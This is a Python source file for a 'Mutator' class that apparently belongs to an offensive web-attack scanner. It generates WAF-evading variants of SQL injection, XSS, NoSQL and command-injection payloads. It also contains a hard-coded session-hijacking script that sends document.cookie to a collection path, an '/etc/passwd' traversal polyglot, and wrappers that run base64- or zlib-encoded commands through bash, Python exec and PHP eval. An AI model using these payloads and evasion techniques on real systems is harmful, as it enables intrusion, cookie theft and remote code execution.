# -*- coding: utf-8 -*-
"""

------------------------------
Responsible for mutating payloads to evade WAF filters.
Techniques:
- SQL Commenting (Inline comments)
- Case Variation
- URL / Double URL Encoding
- Whitespace Substitution
- HTML Entity Encoding
"""
import logging
import urllib.parse
import random
import zlib
import bz2
import base64
import binascii
import html

_logger = logging.getLogger(__name__)

class Mutator:
    @staticmethod
    def _common_polymorph(payload: str) -> set:
        """
        Shared polymorphic mutations from User Code #4 (WAF Annihilator).
        Applies to ALL payload types (SQLi, XSS, etc).
        """
        variants = set()
        b_payload = payload.encode()
        
        # 1. Advanced Base Encodings (WAFs often forget Base32/85)
        try: variants.add(base64.b32encode(b_payload).decode())
        except (TypeError, binascii.Error): pass
        try: variants.add(base64.b16encode(b_payload).decode())
        except (TypeError, binascii.Error): pass
        try: variants.add(base64.b85encode(b_payload).decode())
        except (TypeError, binascii.Error): pass

        # 2. Compression Variants (Hex stream)
        try: variants.add(zlib.compress(b_payload).hex())
        except Exception as exc:
            _logger.debug("[mutator] Suppressed exception: %r", exc)
        try: variants.add(bz2.compress(b_payload).hex())
        except Exception as exc:
            _logger.debug("[mutator] Suppressed exception: %r", exc)
        
        # 3. HTML Entity Polishing
        # & -> &amp; (WAF sees distinct string, Backend decodes)
        variants.add(html.escape(payload))
        
        # 4. Comment Polymorphism
        # /*hash*/payload
        mh = str(binascii.crc32(b_payload) & 0xffffffff)
        variants.add(f"/*{mh}*/{payload}")

        # [WS3] 5. NIGHTMARE v6.0 Integrations (User Code)
        # XOR 0xAA Obfuscation (effective against weak pattern matchers)
        try: variants.add(''.join([chr(ord(c) ^ 0xAA) for c in payload]))
        except (TypeError, ValueError): pass
        
        # Reverse Payload (for specific mirror-logic vulnerabilities)
        variants.add(payload[::-1])
        
        return variants

    @staticmethod
    def _filter_variants(variants: set, max_variants: int) -> list[str]:
        """
        Shared deduplication + UTF-8 safety filter for all mutate_* methods.
        Removes empty, whitespace-only, and non-UTF-8-encodable variants.
        """
        result = []
        for v in variants:
            if not v or not v.strip():
                continue
            try:
                v.encode("utf-8")
                result.append(v)
            except (UnicodeEncodeError, UnicodeDecodeError) as exc:
                _logger.debug("[mutator] Variant dropped (encoding): %r", exc)
        return result[:max_variants]

    @staticmethod
    def _to_fullwidth(payload: str) -> str:
        """Converts ASCII characters to Fullwidth equivalents (WAF normalization bypass)."""
        res = ""
        for char in payload:
            code = ord(char)
            if 33 <= code <= 126:
                res += chr(code + 0xFEE0)
            else:
                res += char
        return res

    @staticmethod
    def _insert_nulls(payload: str) -> str:
        """Randomly inserts null bytes or %00."""
        # Strategy: %00 before dangerous keywords
        keywords = ["SELECT", "UNION", "ALERT", "SCRIPT", "EVAL", "DOCUMENT", "COOKIE"]
        p = payload
        for k in keywords:
            # Case insensitive insert
            if k in p.upper():
                # naive replace for now
                idx = p.upper().find(k)
                # insert %00 inside the keyword e.g. S%00ELECT
                if idx != -1:
                    p = p[:idx+1] + "%00" + p[idx+1:]
        return p

    @staticmethod
    def mutate_sql(payload: str, max_variants: int = 30) -> list[str]:
        """Generates evasive variants of a SQLi payload."""
        variants = set()
        
        # 1. URL Encoding (Standard)
        variants.add(urllib.parse.quote(payload))
        
        # 2. Double URL Encoding (Bypass proxies)
        variants.add(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # 3. Comment Evasion (Space -> /**/)
        # ' OR 1=1 -> '/**/OR/**/1=1
        if " " in payload:
            variants.add(payload.replace(" ", "/**/"))
            variants.add(payload.replace(" ", "%09")) # Tab
            variants.add(payload.replace(" ", "%0A")) # Newline
            variants.add(payload.replace(" ", "+"))   # Plus
            
        # 4. SQL Keyword Case Variation (UNION -> UnIoN)
        # Random case for alpha characters
        variants.add("".join(
            c.upper() if random.random() > 0.5 else c.lower() 
            for c in payload
        ))
        
        # 5. MySQL Specific (Inline Version Comments)
        # UNION SELECT -> /*!50000UNION*/ /*!50000SELECT*/
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            _p = payload.upper()
            variants.add(_p.replace("UNION", "/*!50000UNION*/").replace("SELECT", "/*!50000SELECT*/"))
            variants.add(_p.replace("UNION", "/*!12345UNION*/").replace("SELECT", "/*!12345SELECT*/"))

        # [WS3] 6. Hex Encoding (Effective for string literals)
        # 'admin' -> 0x61646d696e
        try:
            variants.add("0x" + payload.encode().hex())
        except (UnicodeEncodeError, AttributeError): pass
        
        # 7. Unicode Logic Operators
        if " OR " in payload:
            variants.add(payload.replace(" OR ", " || "))
        if " AND " in payload:
            variants.add(payload.replace(" AND ", " && "))

        # 8. [NIGHTMARE] Boolean Logic Equivalents
        # 1=1 -> 1 IN (1), 1 LIKE 1, 1 REGEXP 1
        if "1=1" in payload:
            variants.add(payload.replace("1=1", "1 IN (1)"))
            variants.add(payload.replace("1=1", "1 LIKE 1"))
            variants.add(payload.replace("1=1", "1 REGEXP 1")) # MySQL/SQLite
            variants.add(payload.replace("1=1", "true=true"))
            variants.add(payload.replace("1=1", "1=1e0")) # Scientific notation

        # 9. [NIGHTMARE] Unicode Fullwidth Evasion
        # 'admin' -> 'admin' (WAF normalization often maps these back to ASCII, bypassing regex)
        variants.add(Mutator._to_fullwidth(payload))
        
        # 10. [NIGHTMARE] Null Byte Injection
        variants.add(Mutator._insert_nulls(payload))
            
        # [WS3] From User Code #2: Polyglot/Fragmented
        variants.add(f"\\{payload}\\")
        
        # [WS3] From User Code #3 & #4: Common Polymorphs
        variants.update(Mutator._common_polymorph(payload))

        return Mutator._filter_variants(variants, max_variants)

    @staticmethod
    def mutate_xss(payload: str, max_variants: int = 30) -> list[str]:
        """Generates evasive variants of an XSS payload."""
        variants = set()

        # 1. URL Encodings
        variants.add(urllib.parse.quote(payload))
        
        # 2. Script Tag Variations
        if "<script>" in payload:
            variants.add(payload.replace("<script>", "<script >"))
            variants.add(payload.replace("<script>", "%3Cscript%3E"))
            variants.add(payload.replace("<script>", "<\x00script>"))
            # Case mixing
            variants.add(payload.replace("<script>", "<ScRiPt>"))
            # Double Tag
            variants.add(payload.replace("<script>", "<sc<script>ript>"))

        # 3. Alert Variations
        if "alert(1)" in payload:
            variants.add(payload.replace("alert(1)", "alert`1`"))
            variants.add(payload.replace("alert(1)", "prompt(1)"))
            variants.add(payload.replace("alert(1)", "confirm(1)"))
            # Function constructor
            variants.add(payload.replace("alert(1)", "Function('alert(1)')()"))

        # 4. JavaScript whitespace (comments, slashes)
        if " " in payload:
            variants.add(payload.replace(" ", "/"))
            variants.add(payload.replace(" ", "/**/"))

        # 5. [NIGHTMARE] Protocol Obfuscation
        if "javascript:" in payload:
            variants.add(payload.replace("javascript:", "java\tscript:")) # Tab
            variants.add(payload.replace("javascript:", "java\nscript:")) # Newline
            variants.add(payload.replace("javascript:", "javascript&colon;"))
            variants.add(payload.replace("javascript:", "j&#97;vascript:")) # HTML Entity 'a'

        # 6. [NIGHTMARE] Unicode & Nulls
        variants.add(Mutator._to_fullwidth(payload))
        variants.add(Mutator._insert_nulls(payload))
            
        # [WS3] Common Polymorphs (HTML, Base32, BZ2, etc)
        variants.update(Mutator._common_polymorph(payload))

        # [NIGHTMARE] Ultimate Session Hijacker (One-Shot)
        variants.add(Mutator._generate_nightmare_js())

        return Mutator._filter_variants(variants, max_variants)

    @staticmethod
    def _generate_nightmare_js() -> str:
        """
        Generates a sophisticated JS payload for session hijacking.
        """
        return "fetch('//'+location.host+'/t/nightmare?c='+document.cookie)"

    @staticmethod
    def mutate_polyglot(payload: str, max_variants: int = 30) -> list[str]:
        """
        [NIGHTMARE] Generates polyglot payloads that target multiple contexts/vulns simultaneously.
        SQLi + XSS + SSTI + RCE + Path Traversal in one shot.
        """
        variants = set()
        
        # 1. The "Ultimate" Polyglot (Seclists/Twitter fame)
        variants.add("javascript://%250Aalert(1)//\"/*\\'/*\\'/*--></script><xss>")
        
        # 2. SQLi + XSS Hybrid
        variants.add("'<script>alert(1)</script> OR 1=1--")
        variants.add("\"><img src=x onerror=alert(1)> OR \"1\"=\"1")
        
        # 3. LFI + XSS + SQLi
        variants.add("../../../../../etc/passwd#<script>alert(1)</script>' OR 1=1--")
        
        # 4. SSTI + RCE
        variants.add("{{7*7}}")
        variants.add("${7*7}")
        variants.add("<% 7*7 %>")
        
        # 5. JSON Polyglot
        variants.add('{"x": "val", "y": "<svg/onload=alert(1)>"}')
        
        # 6. Null Byte Polyglot
        variants.add(f"%00{payload}")

        return Mutator._filter_variants(variants, max_variants)

    @staticmethod
    def mutate_rce(payload: str, max_variants: int = 30) -> list[str]:
        """
        [WS3] VOLCANO v7.0 RCE Obfuscation Layer.
        Wraps payloads in zlib/base64 decoders for Python/PHP/Bash.
        """
        variants = set([payload])
        
        # 1. Base64 Basic
        b64 = base64.b64encode(payload.encode()).decode()
        variants.add(f"echo {b64}|base64 -d|bash")
        
        # 2. Python Zlib+Base64 Wrapper (Volcano Signature)
        try:
            compressed = base64.b64encode(zlib.compress(payload.encode())).decode()
            # Python 3 wrapper
            variants.add(f"python3 -c \"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))\"")
            # Python 2 wrapper
            variants.add(f"python -c \"import zlib,base64;exec(zlib.decompress(base64.b64decode('{compressed}')))\"")
        except Exception as exc:
            _logger.debug("[mutator] Suppressed exception: %r", exc)
        
        # 3. PHP Base64 Wrapper
        variants.add(f"eval(base64_decode('{b64}'));")
        
        # 4. [NIGHTMARE] Whitespace Evasion (Bash specific)
        if " " in payload:
            variants.add(payload.replace(" ", "${IFS}"))
            variants.add(payload.replace(" ", "%09"))
            
        # 5. [NIGHTMARE] Fullwidth & Nulls (Less effective for RCE command line but good for filters)
        variants.add(Mutator._to_fullwidth(payload))

        # [WS3] Common Polymorphs (HTML, Base32, BZ2, etc)
        variants.update(Mutator._common_polymorph(payload))

        return Mutator._filter_variants(variants, max_variants)

    @staticmethod
    def mutate_nosql(payload: str, max_variants: int = 30) -> list[str]:
        """
        Generates evasive variants for NoSQL Injection (MongoDB/Generic).
        """
        variants = set()
        
        # 1. Standard URL Encoding
        variants.add(urllib.parse.quote(payload))
        
        # 2. Logic Operators (JS based)
        # ' || 1==1 -> ' || true
        if "1==1" in payload:
            variants.add(payload.replace("1==1", "true"))
            variants.add(payload.replace("1==1", "1"))
            
        # 3. Unicode/Fullwidth
        variants.add(Mutator._to_fullwidth(payload))
        
        # 4. Hex/Unicode Escapes for JS contexts
        # ' -> \u0027
        # payload string might be injected into a JS context in $where
        escaped = ""
        for c in payload:
            if c.isalnum(): escaped += c
            else: escaped += f"\\u{ord(c):04x}"
        variants.add(escaped)
        
        # 5. Comment variants
        if "//" in payload:
            variants.add(payload.replace("//", "/*"))
            
        # [WS3] Common Polymorphs
        variants.update(Mutator._common_polymorph(payload))

        return Mutator._filter_variants(variants, max_variants)
